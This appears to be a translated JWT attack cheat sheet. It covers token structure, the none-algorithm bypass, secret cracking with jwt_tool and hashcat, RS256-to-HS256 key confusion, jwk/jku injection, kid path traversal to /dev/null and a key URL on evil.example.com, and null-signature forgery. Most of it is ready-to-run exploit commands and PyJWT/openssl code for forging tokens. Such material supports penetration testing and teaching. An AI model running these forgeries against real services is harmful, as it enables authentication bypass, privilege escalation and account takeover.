entries.title: What a JWT is and where to look
entries.body:
A JSON Web Token (JWT, RFC 7519) is a compact, self-contained way to securely transmit data between parties as a JSON object. The data is digitally signed, so it can be trusted.
• Look for the token in cookies, in the Authorization: Bearer header, in the response body after login, in localStorage/sessionStorage.
• It is recognizable by its characteristic structure of three Base64URL parts separated by dots, and it almost always starts with eyJ (this is Base64 of {").

entries.title: JWT format - three parts
entries.body:
JSON Web Token: Base64(Header).Base64(Data).Base64(Signature)

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY

It is split into 3 components separated by a dot:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature

entries.title: Header - basic form

rows: The cryptographic algorithm protecting the JWS
Link to a resource with a set of JSON public keys
The public key used to sign the JWS
Identifier of the key protecting the JWS
URL of the X.509 certificate or certificate chain
X.509 certificate / chain in PEM used to sign the JWS
Base64url SHA-1 thumbprint of the DER encoding of the X.509 certificate
Base64url SHA-256 thumbprint of the DER encoding of the X.509 certificate
RSASSA-PSS using SHA-256 and MGF1 with SHA-256
RSASSA-PSS using SHA-384 and MGF1 with SHA-384
RSASSA-PSS using SHA-512 and MGF1 with SHA-512
No digital signature or MAC performed

entries.title: Default algorithm
entries.body:
By default the algorithm is "HS256" (HMAC SHA256, symmetric encryption).
"RS256" is used for asymmetric purposes (RSA: encryption with the public key and signing with the private key).
• HS256 uses a secret key both to sign and to verify every message.
• RS256 signs with the private key and verifies with the public key.

entries.title: Payload - example and claims
Reserved claims
entries.body:
iss - the token issuer.
exp - expiration time (Unix time in seconds); expired tokens are rejected.
iat - the time the JWT was issued; used to determine the token's age.
nbf - "not before": a point in the future from which the token becomes active.
jti - a unique JWT identifier; protects against reuse (replay).
sub - the token's subject (used rarely).
aud - the token's audience (also used rarely).

entries.title: Tools for attacking JWTs
entries.body:
ticarpi/jwt_tool — a toolkit for testing, modifying, and cracking JWTs.
brendan-rius/c-jwt-cracker — a JWT brute-force cracker in C.
PortSwigger/JOSEPH — a Burp extension for pentesting JOSE (signing/encryption).
portswigger/JWT Editor — a Burp extension for editing and signing JWTs.
jwt.io — an online encoder/decoder.

entries.title: jwt_tool - recon, scanning, exploitation
entries.body:
# Recon — parse the token
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw

# Scanning (playbook all-tests)
python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb

# Exploitation
python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin

# Fuzzing kid
python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt

entries.title: jwt_tool - injecting headers and claims
entries.body:
# Inject headers
python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2

# Inject a claim into the payload
python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3

entries.title: None Algorithm (CVE-2015-9235)
entries.body:
JWT supports a None algorithm for signing (probably introduced for debugging). This can critically reduce the application's security.

Spelling variants of alg:
none
None
NONE
nOnE

To exploit it: decode the JWT, change the signing algorithm. This will NOT work until you REMOVE the signature itself. Alternatively, you can modify an existing JWT (be careful with the exp expiration).

entries.title: None - exploitation via jwt_tool
entries.body: python3 jwt_tool.py [JWT_HERE] -X a

entries.title: None - building the token manually (PyJWT)
entries.body:
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
decodedToken = jwt.decode(jwtToken, options={"verify_signature": False})

# decode the token before encoding with type 'None'
noneEncoded = jwt.encode(decodedToken, key='', algorithm='none')

print(noneEncoded)

entries.title: Where to look for the secret and a wordlist of known ones
entries.body:
To create a JWT, a secret key signs the header and payload. If an attacker obtains the secret, they can create, modify, and sign their own tokens, bypassing access control.

A useful list of 3502 publicly known JWT secrets: wallarm/jwt-secrets/jwt.secrets.list - it includes your_jwt_secret, change_this_super_secret_random_string, and so on.
A signature with a weak/short secret (HS256) can be brute-forced offline - this is the first thing worth checking.

entries.title: Brute-forcing the secret via jwt_tool
entries.body:
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C

entries.title: Brute-forcing the secret via hashcat (mode 16500)
entries.body:
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Dictionary attack with rules
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# Full brute force (mask)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

entries.title: Encoding/decoding a JWT with a known secret
entries.body:
# pip install pyjwt
import jwt
encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
jwt.decode(encoded, 'secret', algorithms=['HS256'])

entries.title: Decoding a token in jwt_tool (-T)
entries.body:
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] name = "John Doe"

entries.title: The essence of the attack (CVE-2016-5431)
entries.body:
If the server code expects a token with alg=RSA but receives a token with alg=HMAC, it may mistakenly use the PUBLIC key as a symmetric HMAC secret when verifying the signature.
Since the public key is often available to the attacker, they change the algorithm in the header to HS256 and sign the data with the RSA public key. When the application uses the same RSA key pair as the web server's TLS, the key is obtained like this:
openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout

entries.title: Signing with the public key as HMAC (PyJWT)
entries.body:
import jwt
public = open('public.pem', 'r').read()
print(public)
print(jwt.encode({"data":"test"}, key=public, algorithm='HS256'))

entries.title: Warning about the fix in PyJWT
entries.body:
This behavior is fixed in the Python library and will now return an error:
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
To reproduce it you need an old version: pip install pyjwt==0.4.3

NB: key confusion itself is NOT dead - it lives in the APPLICATION whenever the verifier allows both a symmetric and an asymmetric alg: jwt.decode(token, public_key, algorithms=['HS256','RS256']). jwt_tool -X k and Burp JWT Editor still exploit it today.

entries.title: Exploitation via jwt_tool: key confusion RS256→HS256
entries.body: python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem

entries.title: Via JWT Editor (Burp) - steps
entries.body:
1. Find the public key, usually in /jwks.json or /.well-known/jwks.json.
2. Load it on the JWT Editor Keys tab → New RSA Key.
3. In the dialog paste the JWK obtained earlier: {"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}
4. Select the PEM radio button and copy the resulting PEM key.
5. On the Decoder tab, Base64-encode the PEM.
6. Go back to JWT Editor Keys and generate a New Symmetric Key in JWK format.
7. Replace the value of the k parameter with the Base64 PEM you just copied.
8. Change the token's alg to HS256 and edit the data.
9. Click Sign and leave the Don't modify header option.

entries.title: Manually turning RS256 into HS256
entries.body:
# 1. Convert the public key (key.pem) to HEX
cat key.pem | xxd -p | tr -d "\\n"
2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

# 2. Generate an HMAC signature, feeding the public key as ASCII-hex, for the previously edited token
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0

# 3. Convert the signature (Hex to base64 URL)
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"

# 4. Append the signature to the edited payload
[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA

entries.title: The essence of the attack (CVE-2018-0114)
entries.body: A vulnerability in Cisco node-jose before 0.11.0 allowed an unauthenticated remote attacker to re-sign tokens with a key embedded in the token itself. The JWS standard permits embedding a public key (JWK) in the JWS header, and that key is then trusted during verification. The attacker forges valid JWS: removes the original signature, adds their own public key to the header, and signs the object with their own (attacker-controlled) private key.

entries.title: Exploitation via jwt_tool / JWT Editor: key injection (jwk)
entries.body:
# jwt_tool: embed a jwk and re-sign
python3 jwt_tool.py [JWT_HERE] -X i

# JWT Editor (Burp):
# 1. Add a New RSA key
# 2. In Repeater, on the JWT tab, edit the data
# 3. Attack > Embedded JWK

entries.title: Parsed token with an embedded jwk
The essence of the attack and where to look for JWKS
entries.body:
The value of the jku header points to the URL of a JWKS file. By replacing jku with an attacker-controlled URL hosting their public key, you can sign the token with your own private key - the service will download the malicious public key and verify the signature successfully.

JWKS is sometimes publicly available at standard endpoints:
/jwks.json
/.well-known/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs

For the attack, create your own key pair and host your JWKS.

entries.title: Your own JWKS file
Exploitation via jwt_tool / JWT Editor: jku injection
entries.body:
# jwt_tool
python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json

# JWT Editor (Burp):
# 1. Generate a new RSA key and host it
# 2. Edit the token's data
# 3. Replace the kid header with the one from your JWKS
# 4. Add a jku header and sign the JWT (the Don't modify header option must be enabled)

entries.title: Parsed token with jku
entries.body:
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[Signed with new Private key; Public key exported]

entries.title: The essence and exploitation variants of kid
entries.body:
The kid (key ID) claim is an optional header parameter indicating the identifier of the key that signed/encrypted the JWT. By itself it provides no security, it only helps the recipient find the right key. The content of the file referenced by kid is used to generate the signature.

Typical ways to abuse kid:
• Obtain the key content in order to change the payload.
• Substitute the path to the key with your own.
• Substitute the path with a file that has predictable content.
• Inject SQL and Command injections into kid.

entries.title: kid - local and remote key file
kid - substituting the path with your own key (PyJWT)
entries.body:
>>> jwt.encode(
...     {"some": "payload"},
...     "secret",
...     algorithm="HS256",
...     headers={"kid": "http://evil.example.com/custom.key"},
... )

entries.title: kid - path to a file with predictable content
entries.body:
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"

entries.title: Recover Public Key from two signed JWTs
entries.body:
The RS256, RS384, and RS512 algorithms use RSA with PKCS#1 v1.5 padding. The property: having two different messages with signatures, you can compute the public key.
This is useful when the public key is not published anywhere but is needed for a key confusion attack (RS256→HS256).
SecuraBV/jws2pubkey - computes the RSA public key from two signed JWTs.

entries.title: jws2pubkey - running it
entries.body:
docker run -it ttervoort/jws2pubkey JWS1 JWS2
docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}

entries.title: Disclosure of the correct signature (CVE-2019-7644)
entries.body:
Send a JWT with an INVALID signature - the endpoint may return an error that discloses the correct signature (Expected ... got ...). This signature can then be used to forge a token.

Examples of such errors:
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=

entries.title: Null Signature Attack (CVE-2020-28042)
entries.body:
Send a JWT with the HS256 algorithm WITHOUT a signature (the part after the second dot is empty):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

Parsed token:
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}

entries.title: Exploitation via jwt_tool: null signature
entries.body: python3 jwt_tool.py JWT_HERE -X n
